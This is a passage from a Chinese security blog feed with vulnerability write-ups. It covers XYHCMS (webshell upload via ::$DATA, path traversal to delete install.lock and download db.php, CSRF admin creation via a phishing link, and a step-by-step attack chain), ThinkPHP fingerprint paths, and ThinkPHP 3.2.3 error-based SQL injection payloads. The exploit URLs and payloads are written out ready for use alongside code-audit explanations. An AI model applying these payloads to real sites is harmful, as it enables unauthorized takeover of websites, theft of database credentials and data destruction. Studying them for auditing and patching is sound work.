class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">foreach ($_file_exts as $ext) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">if (in_array($ext, $_no_exts)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;允许附件类型错误！不允许后缀为：php,asp,aspx,jsp！&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li><li><h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>进入后台</li><li>系统设置-&gt;网站设置-&gt;上传配置-&gt;允许附件类型</li><li>添加类型 <code>shell.php::$DATA</code></li><li>点击下面的 <code>水印图片上传</code>上传以上后缀shell，此时点不点提交都已经传入服务器</li><li>之后会在图片部分显示上传路径，在windows下面，会自动忽略后面的。</li><li>用蚁剑访问 <code>http://domain/路径去掉::$DATA</code></li></ol></li></ul><h3 id="任意文件删除漏洞（后台）"><a href="#任意文件删除漏洞（后台）" class="headerlink" title="任意文件删除漏洞（后台）"></a>任意文件删除漏洞（后台）</h3><ul><li><h4 id="漏洞文件位置-4"><a href="#漏洞文件位置-4" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>/App/Manage/Controller/DatabaseController.class.php</code></p></li><li><h4 id="漏洞原因-5"><a href="#漏洞原因-5" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>路径过滤不严</p></li><li><h4 id="漏洞代码-4"><a href="#漏洞代码-4" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;删除sql文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">public function delSqlFiles() &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$id &#x3D; I(&#39;id&#39;, 0, &#39;intval&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">$batchFlag &#x3D; I(&#39;get.batchFlag&#39;, 0, &#39;intval&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;批量删除</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">if ($batchFlag) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">$files &#x3D; I(&#39;key&#39;, array());</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#125; else &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">$files[] &#x3D; I(&#39;sqlfilename&#39;, &#39;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">if (empty($files)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;请选择要删除的sql文件&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">foreach ($files as $file) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">$_ext &#x3D; pathinfo($file, PATHINFO_EXTENSION);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接后直接删除</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">foreach ($files as $file) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">unlink($this-&gt;getDbPath() . &#39;&#x2F;&#39; . $file);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">$this-&gt;success(&quot;已删除：&quot; . implode(&quot;,&quot;, $files), U(&#39;Database&#x2F;restore&#39;));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure><p>删除的文件位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function getDbPath() &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">return &#39;.&#x2F;Data&#x2F;resource&#x2F;backupdata&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li></ul><ul><li><h4 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li><p>登录后台</p></li><li><p>删除安装锁文件</p><ol><li><p>get方式</p><p><code>http://domain/xyhai.php? s=/Database/delSqlFiles/sqlfilename/..\\..\\..\\install/install.lock</code></p></li><li><p>post方式</p><p><code>http://domain/xyhai.php?s=/Database/delSqlFiles/batchFlag/1</code></p><p>POST数据：<code>key[]=../../../install/install.lock</code></p></li></ol></li><li><p>之后访问 <code>http://domain/install</code>重装cms</p></li></ol></li><li><h4 id="实际利用-4"><a href="#实际利用-4" class="headerlink" title="实际利用"></a>实际利用</h4><p>在官网发布的v3.5版本已经做了过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if (false !&#x3D;&#x3D; strpos($file, &#39;..&#x2F;&#39;) || false !&#x3D;&#x3D; strpos($file, &#39;..\\&#39;) || $_ext !&#x3D; &#39;sql&#39;) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;删除失败：sql文件非法！&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure><p>所以之后下载的没这个漏洞了，之前下载才有这个漏洞。</p></li></ul><h3 id="任意文件下载（后台）"><a href="#任意文件下载（后台）" class="headerlink" title="任意文件下载（后台）"></a>任意文件下载（后台）</h3><ul><li><h4 id="漏洞文件位置-5"><a href="#漏洞文件位置-5" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>/App/Manage/Controller/DatabaseController.class.php</code>的<code>downfile()</code>方法</p></li><li><h4 id="漏洞原因-6"><a href="#漏洞原因-6" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p> 没有对下载的文件做任何限制 </p></li><li><h4 id="漏洞代码-5"><a href="#漏洞代码-5" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function downFile() &#123;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    if (empty($_GET[&#39;file&#39;]) || empty($_GET[&#39;type&#39;]) || !in_array($_GET[&#39;type&#39;], array(&quot;zip&quot;, &quot;sql&quot;))) &#123;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        $this-&gt;error(&quot;下载地址不存在&quot;);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    &#125;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    $path     &#x3D; array(&quot;zip&quot; &#x3D;&gt; $this-&gt;getDbPath() . &quot;Zip&#x2F;&quot;, &quot;sql&quot; &#x3D;&gt; $this-&gt;getDbPath() . &#39;&#x2F;&#39;);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    $filePath &#x3D; $path[$_GET[&#39;type&#39;]] . $_GET[&#39;file&#39;];  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    if (!file_exists($filePath)) &#123;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        $this-&gt;error(&quot;该文件不存在，可能是被删除&quot;);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    &#125;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">     $filename &#x3D; basename($filePath);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">     header(&quot;Content-type: application&#x2F;octet-stream&quot;);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">     header(&#39;Content-Disposition: attachment; filename&#x3D;&quot;&#39; . $filename . &#39;&quot;&#39;);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">     header(&quot;Content-Length: &quot; . filesize($filePath));  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">     readfile($filePath);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line"> &#125;</span></pre></td></tr></table></figure></li><li><h4 id="漏洞利用-6"><a href="#漏洞利用-6" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>登录后台</li><li>访问<code>http://domain/xyhai.php?s=/Database/downFile/file/..\\..\\..\\App\\Common\\Conf\\db.php/type/zip</code></li><li>下载到数据库配置文件</li></ol></li><li><h4 id="实际利用-5"><a href="#实际利用-5" class="headerlink" title="实际利用"></a>实际利用</h4><p> 在v3.5版本中，<code>/App/Manage/Controller/DatabaseController.class.php</code>文件的最后更改时间为 <code>2019/9/16</code>，洞被补上了，downfile方法直接被删除了。</p></li></ul><h3 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h3><ul><li><h4 id="漏洞文件位置-6"><a href="#漏洞文件位置-6" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>App/Manager/Controller/AuthController.class.php</code></p></li><li><h4 id="漏洞原因-7"><a href="#漏洞原因-7" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>验证不严，在别人报送漏洞后，虽然加了一个验证，但是可以绕过。</p></li><li><h4 id="漏洞代码-6"><a href="#漏洞代码-6" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><p>`public function addUser() {</p><pre><code>if (IS_POST) {    //用户组    $group_id   = I(&apos;group_id&apos;, array());    $department = I(&apos;department&apos;, array());    $_furl      = $_SERVER[&apos;HTTP_REFERER&apos;];    $_turl      = &apos;://&apos; . $_SERVER[&apos;HTTP_HOST&apos;] . $_SERVER[&apos;REQUEST_URI&apos;];     //HTTP_HOST有端口会带端口          //在这里验证了refere头，但是可以referre可由我们控制          if (stripos($_furl, $_turl) === false) {              $this-&gt;error(&apos;非法请求!&apos;);          }          if (empty($department)) {              $this-&gt;error(&apos;请选择部门&apos;);          }          if (empty($group_id)) {              $this-&gt;error(&apos;请选择职位&apos;);          }          //M验证          $validate = array(              array(&apos;username&apos;, &apos;require&apos;, &apos;用户名不能为空！&apos;),              array(&apos;password&apos;, &apos;require&apos;, &apos;密码不能为空！&apos;),              array(&apos;password&apos;, &apos;5,20&apos;, &apos;密码必须在5到20位之间&apos;, 0, &apos;length&apos;),              array(&apos;username&apos;, &apos;&apos;, &apos;用户名已经存在！&apos;, 0, &apos;unique&apos;, 1),          );          $data = M(&apos;Admin&apos;);          if (!$data-&gt;validate($validate)-&gt;create()) {              $this-&gt;error($data-&gt;getError());          }          $password         = get_password($data-&gt;password);          $data-&gt;password   = $password[&apos;password&apos;];          $data-&gt;encrypt    = $password[&apos;encrypt&apos;];          $data-&gt;status     = I(&apos;status&apos;, 0, &apos;intval&apos;);          $data-&gt;department = implode(&apos;,&apos;, $department);          $data-&gt;login_time = date(&apos;Y-m-d H:i:s&apos;);          $data-&gt;login_ip   = &apos;&apos;;          if ($id = $data-&gt;add()) {              $group_data = array();              foreach ($group_id as $key =&gt; $val) {                  $group_data[] = array(&apos;uid&apos; =&gt; $id, &apos;group_id&apos; =&gt; $val);              }              $result = M(&apos;AuthGroupAccess&apos;)-&gt;addAll($group_data);              if ($result) {                  $this-&gt;success(&apos;添加成功&apos;, U(&apos;indexOfUser&apos;));              } else {                  $this-&gt;error(&apos;权限设置失败|用户添加成功&apos;);              }          } else {              $this-&gt;error(&apos;添加失败&apos;);          }          exit();      }</code></pre></li></ul><ul><li><h4 id="漏洞利用-7"><a href="#漏洞利用-7" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>在自己服务器构造html代码，要绕过referer，以前写过类似的文章</li><li>生成短链接</li><li>到网站留言，等鱼儿上钩。</li><li>等添加后登录即可</li></ol></li><li><h4 id="实际利用-6"><a href="#实际利用-6" class="headerlink" title="实际利用"></a>实际利用</h4><p>v2 ，v3.6也存在</p><p>v2版本url  <code>http://domain/index.php?g=Manage&amp;m=Rbac&amp;a=addUser</code></p></li></ul><h3 id="综合利用"><a href="#综合利用" class="headerlink" title="综合利用"></a>综合利用</h3><ol><li><p>先尝试弱口令</p></li><li><p>再尝试csrf拿到管理员权限</p></li><li><p>拿到后台随便搞</p></li><li><p>心中默念安全法</p></li></ol><h3 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h3><p>经过几个网站测试，发现后台xyhai.php文件可能会被改，可以尝试admin.php</p>]]></content>
    
    <summary type="html">
    
      phpthink架构的xyhcms漏洞整理
    
    </summary>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="代码审计" scheme="http://h3art3ars.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="web" scheme="http://h3art3ars.github.io/tags/web/"/>
    
      <category term="cms" scheme="http://h3art3ars.github.io/tags/cms/"/>
    
  </entry>
  
  <entry>
    <title>thinkphp Notes</title>
    <link href="http://h3art3ars.github.io/2019/12/23/thinkphp-Notes/"/>
    <id>http://h3art3ars.github.io/2019/12/23/thinkphp-Notes/</id>
    <published>2019-12-23T04:47:06.000Z</published>
    <updated>2019-12-23T04:51:53.041Z</updated>
    
    <content type="html"><![CDATA[<h2 id="thinkphp安装"><a href="#thinkphp安装" class="headerlink" title="thinkphp安装"></a>thinkphp安装</h2><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">composer create-project topthink&#x2F;think tp</span></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">cd tp</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">php think run</span></pre></td></tr></table></figure><p>然后就可以在浏览器中访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8000</span></pre></td></tr></table></figure><p>如果需要更新框架使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">composer update topthink&#x2F;framework</span></pre></td></tr></table></figure><hr><h2 id="thinkphp-cms-特征目录识别"><a href="#thinkphp-cms-特征目录识别" class="headerlink" title="thinkphp cms 特征目录识别"></a>thinkphp cms 特征目录识别</h2><p>thinkphp的文件可能会放在网站根目录，也可能放在/ThinkPHP内或者独自建立/thinkphp文件夹放进去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;index.php?c&#x3D;4e5e5d7364f443e28fbf0d3ae744a59a</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;4e5e5d7364f443e28fbf0d3ae744a59a</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;LICENSE.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;logo.png</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;README.md</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;composer.json</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;Application&#x2F;README.md</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;Extend&#x2F;README.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;Extend&#x2F;Vendor&#x2F;readme.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;ThinkPHP&#x2F;LICENSE.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;ThinkPHP&#x2F;logo.png</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;ThinkPHP&#x2F;composer.json</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;ThinkPHP&#x2F;Application&#x2F;README.md</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;ThinkPHP&#x2F;Extend&#x2F;README.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;ThinkPHP&#x2F;Extend&#x2F;Vendor&#x2F;readme.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;think</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;phpunit.xml</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;public&#x2F;favicon.ico</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;public&#x2F;robots.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;thinkphp&#x2F;.travis.yml</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;thinkphp&#x2F;codecov.yml</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;thinkphp&#x2F;CONTRIBUTING.md</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;thinkphp&#x2F;LICENSE.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;thinkphp&#x2F;logo.png</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;thinkphp&#x2F;composer.json</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      phpthink杂七杂八笔记
    
    </summary>
    
    
      <category term="Notes" scheme="http://h3art3ars.github.io/categories/Notes/"/>
    
    
      <category term="Notes" scheme="http://h3art3ars.github.io/tags/Notes/"/>
    
      <category term="thinkphp" scheme="http://h3art3ars.github.io/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>think3.2.3 sql注入</title>
    <link href="http://h3art3ars.github.io/2019/12/23/think3-2-3-sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://h3art3ars.github.io/2019/12/23/think3-2-3-sql%E6%B3%A8%E5%85%A5/</id>
    <published>2019-12-23T04:16:44.000Z</published>
    <updated>2019-12-23T04:21:41.980Z</updated>
    
    <content type="html"><![CDATA[<h2 id="update注入-lt-3-2-3"><a href="#update注入-lt-3-2-3" class="headerlink" title="update注入(&lt;=3.2.3)"></a>update注入(&lt;=3.2.3)</h2><h3 id="漏洞代码实例"><a href="#漏洞代码实例" class="headerlink" title="漏洞代码实例"></a>漏洞代码实例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$User&#x3D;M(&#39;user&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$user[&#39;id&#39;]&#x3D;I(&#39;id&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$data[&#39;name&#39;]&#x3D;I(&#39;name&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$data[&#39;money&#39;]&#x3D;I(&#39;money&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">$res&#x3D;$User-&gt;where($user)-&gt;save($data);</span></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?id[]&#x3D;bind&amp;id[1]&#x3D;1%20and%20%20updatexml(1,concat(0x5b,(select%20user()),0x5d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;UPDATE &#96;user&#96; SET &#96;money&#96;&#x3D;&#39;0&#39;,&#96;user&#96;&#x3D;&#39;&#39; WHERE &#96;id&#96; &#x3D; &#39;&#39; and updatexml(1,concat(0x5b,(select user()),0x5d),1)</span></pre></td></tr></table></figure><h3 id="漏洞流程"><a href="#漏洞流程" class="headerlink" title="漏洞流程"></a>漏洞流程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">save($data,$options)-&gt;_parseOptions($Options)-&gt;update($data,$options)-&gt;parsewhere($option[$where])-&gt;parsewhereitem($key,$value)</span></pre></td></tr></table></figure><ul><li><p>$Options参数为空，但经过_parseOptions($Options)方法将参数中的id[]数组变为$where</p></li><li><p>进入parsewhereitem()方法将id分为键值 如果id[0]==bind，则将id[1]拼接到</p></li><li><p>如果id[0]==bind，则将id[1]拼接到 <code>$whereStr .= $key.&#39; = :&#39;.$val[1];</code></p></li><li><p><code>:n</code>表示更新的数组 <code>data[n]</code>,可以结合sql语句闭合一下，有时不闭合也可以造成注入</p></li><li><p>前面的exp变为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?id[]&#x3D;bind&amp;id[1]&#x3D;1%20and%20%20updatexml(1,concat(0x5b,(select%20user()),0x5d),1)&amp;user&#x3D;admin&amp;money&#x3D;11</span></pre></td></tr></table></figure><p>则语句则变成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">UPDATE &#96;user&#96; SET &#96;money&#96;&#x3D;11,&#96;user&#96;&#x3D;&#39;admin&#39; WHERE &#96;id&#96; &#x3D; 11 and updatexml(1,concat(0x5b,(select user()),0x5d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;id&#x3D;:1 and updat.... </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;而 :1&#x3D;data[1]&#x3D;money&#x3D;11</span></pre></td></tr></table></figure></li></ul><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>经过<code>_parseOptions($Options)</code>方法将可控变量合并到<code>$Options</code>参数中</p><h2 id="find-select-delete注入-lt-3-2-3"><a href="#find-select-delete注入-lt-3-2-3" class="headerlink" title="find_select_delete注入(&lt;=3.2.3)"></a>find_select_delete注入(&lt;=3.2.3)</h2><h3 id="漏洞代码实例-1"><a href="#漏洞代码实例-1" class="headerlink" title="漏洞代码实例"></a>漏洞代码实例</h3><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">  $res&#x3D;M(&#39;user&#39;)-&gt;find(I(&#39;id&#39;));      &#x2F;&#x2F;select * from user where id &#x3D;1;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">  $res&#x3D;M(&#39;user&#39;)-&gt;select(I(&#39;id&#39;));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$res&#x3D;M(&#39;user&#39;)-&gt;delete(I(&#39;id&#39;));</span></pre></td></tr></table></figure></li></ul><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">  delete 方法 第一个参数可外部控制时可注入</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">  select 方法 第一个参数可外部控制时可注入</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  find 方法 第一个参数可外部控制时可注入</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">  Add 方法 第二个参数可外部控制时可注入</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">  addAll 方法 第二个参数可外部控制时可注入</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">save 方法 第二个参数可外部控制时可注入</span></pre></td></tr></table></figure></li></ul><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?id[where]&#x3D;1 and updatexml(1,concat(0x7b,(select user()),0x7d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;[find&#x2F;select]select * from user where id&#x3D;1 and updatexml(1,concat(0x7b,(select user()),0x7d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">?id[table]&#x3D;user%20where%20id&#x3D;updatexml(1,concat(0x5b,(select%20user()),0x5d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span 